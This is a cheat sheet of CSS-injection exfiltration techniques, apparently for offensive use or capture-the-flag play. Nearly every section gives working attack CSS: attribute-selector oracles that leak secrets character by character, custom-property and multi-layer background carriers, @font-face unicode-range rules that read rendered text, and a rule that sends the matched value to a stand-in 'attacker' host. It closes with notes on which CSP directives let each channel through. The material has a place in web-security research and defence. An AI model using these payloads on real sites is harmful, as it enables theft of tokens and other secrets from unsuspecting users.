# CSS oracle deep — the declarative channel, exhaustively

Every CSS-oracle variant — the selector shapes, the carrier, the exfil.

---

## 1. The attribute-selector shapes — the match types

```css
/* prefix — 'the secret starts with X' */
body[secret^="ab"]{--m:url('/leak/ab')}
/* suffix — 'the secret ends with X' */
body[secret$="ef"]{--m:url('/leak/ef')}
/* substring — 'the secret contains X' */
body[secret*="abc"]{--m:url('/leak/abc')}
/* exact — 'the secret IS X' */
body[secret="full"]{--m:url('/leak/full')}
/* in-set — 'the secret contains char X' */
body[secret*="a"]{--m:url('/leak/has-a')}
```

## 2. The custom-property carrier — the conditional URL

```css
/* a matching rule sets a custom property */
body[secret^="ab"]{--m_ab:url('/leak/ab')}
body[secret$="ef"]{--m_ef:url('/leak/ef')}
body[secret*="abc"]{--m_abc:url('/leak/abc')}
/* the consumer — a multi-layer background fetches the matched URLs */
#trig{background-image:var(--m_ab,none),var(--m_ef,none),var(--m_abc,none)}
```

```text
the custom-property trick: a matching rule sets a --m_* variable;
the #trig element's multi-layer background-image references all of
them — only the MATCHED rules' URLs are fetched — the requested URLs
ARE the match. a `none` default for unmatched properties.
```

## 3. The @font-face unicode-range — the text-reading oracle

```css
/* one @font-face per alphabet char — each its own unicode-range + URL */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
/* ... the whole 62-char alphabet (a-z, A-Z, 0-9) */
#secret{font-family:x;display:block !important}
```

```text
the browser downloads a face ONLY when a char inside its
unicode-range renders — the requested font URLs ARE the character
SET of the rendered text. the secret must be in TEXT (rendered),
not just an attribute.
```

## 4. The stylesheet carrier — how the rules reach the page

```text
a custom-css surface — a stored stylesheet the page loads:
  <link rel=stylesheet href="/paper/<id>">
  + a <div id=trig></div>
the rules fire declaratively when the page loads — no JS needed.
```

## 5. The selector-target requirement — attribute vs text

```text
an attribute-selector needs the secret IN an attribute:
  <body data-secret="abc"> — a data-* attribute
  <input value="abc"> — a value attribute
  <div secret="abc"> — a custom attribute
a text-node secret needs a unicode-range @font-face:
  <div id="secret">abc</div> — the rendered text
```

## 6. The multi-layer background — the parallel-fetch trick

```css
/* a multi-layer background-image fetches EACH var() — the
   unmatched ones are 'none' */
#trig{
  background-image:
    var(--m_a,none),var(--m_b,none),var(--m_c,none),
    var(--m_ab,none),var(--m_ef,none),var(--m_abc,none),
    /* ... hundreds or thousands of layers */
}
```

```text
each var() resolves to a url() (a matched rule) or 'none' (no rule
set it) — the browser fetches exactly the matched URLs — the
requested URLs ARE the matched selectors. a thousand rules = a
thousand parallel fetches.
```

## 7. The control pair — the channel-proof

```css
/* always-true — a condition that always matches */
body[secret]{--yes:url('/leak/YES')}
/* never-true — a condition that never matches */
body[nosuchattr]{--no:url('/leak/NO')}
#trig{background-image:var(--yes,none),var(--no,none)}
```

```text
a YES hit + a NO miss → the channel works.
a NO hit → 'no leak' is a broken channel, not a negative answer.
```

## 8. The prefix-search oracle — a char-by-char extend

```css
/* 'does the secret start with known+c' — a binary-search extend */
body[secret^="a"]{--m:url('/leak/a')}
body[secret^="ab"]{--m:url('/leak/ab')}
```

```text
a prefix-selector — 'does the secret start with X' — extend the
known prefix one char at a time — a binary-search.
```

## 9. The n-gram oracle — the substring coverage

```css
/* 'does the secret contain X' — a substring oracle over all n-grams */
body[secret*="abc"]{--m:url('/leak/abc')}
```

```text
a substring-selector — 'does the secret contain "abc"' — queried
over all 1/2/3-grams — the matched set is the n-gram coverage the
beam search stitches into the secret.
```

## 10. The in-set oracle — the char-presence read

```css
/* 'does the secret contain char X' — a char-presence read */
body[secret*="a"]{--m:url('/leak/has-a')}
```

```text
a 'does the secret contain char X' selector — a char-presence read —
the set of chars that appear — a char-set oracle via an attribute.
```

## 11. The exfil-per-rule — the URL as the channel

```css
/* each rule's url() is the exfil — the requested URL IS the match */
body[secret^="ab"]{--m:url('https://attacker/leak/ab')}
```

```text
the url() is the exfil — the requested URL carries the match in its
path — your listener sees '/leak/ab' → 'the secret starts with "ab"'.
```

## 12. The CSP-gate — which directive allows the carrier

```text
a bg-image exfil needs 'img-src *' or a wildcard — 'img-src self'
blocks it.
a font-face exfil needs 'font-src *' — 'font-src self' blocks it.
check WHICH directive has the hole — a font-src wildcard is the
@font-face channel; an img-src wildcard is the bg-image channel.
```
